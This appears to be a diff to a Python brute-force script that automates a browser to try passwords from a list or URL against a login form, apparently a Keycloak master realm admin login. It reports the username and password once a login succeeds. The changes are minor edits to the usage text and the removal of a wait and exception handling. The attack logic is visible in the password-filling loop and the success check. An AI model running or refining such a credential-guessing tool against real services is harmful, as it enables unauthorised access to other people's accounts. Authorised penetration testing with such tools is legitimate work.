@@ -40,10 +40,10 @@ def main():
 
     if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
         print("Usage: python3 brute-force-attack.py [username (optional, default: admin)] [password list file or URL (optional, default: password_list.txt)]")
-        print("Example: python3 brute-force-attack.py")
-        print("Example: python3 brute-force-attack.py admin")
-        print("Example: python3 brute-force-attack.py admin passwords.txt")
-        print("Example: python3 brute-force-attack.py admin https://example.com/passwords.txt")
+        print("Example: ./brute-force-attack.py")
+        print("Example: ./brute-force-attack.py admin")
+        print("Example: ./brute-force-attack.py admin passwords.txt")
+        print("Example: ./brute-force-attack.py admin https://example.com/passwords.txt")
         sys.exit(0)
 
     # Get password source from command-line arguments. Use default if not provided.
@@ -75,15 +75,11 @@ def main():
             page.fill('input#password', password)
             page.click('input[type="submit"]')
 
-            try:
-                page.wait_for_load_state('networkidle')
-                if page.url.endswith('/auth/realms/master/account/'):
-                    print("\n--- Login successful! ---")
-                    print(f"Username: {username}")
-                    print(f"Password: {password}")
-                    break
-            except:
-                pass
+            if page.url.endswith('/auth/realms/master/account/'):
+                print("\n--- Login successful! ---")
+                print(f"Username: {username}")
+                print(f"Password: {password}")
+                break
 
         if i == len(passwords) - 1:
             print("\nLogin failed for all passwords.")
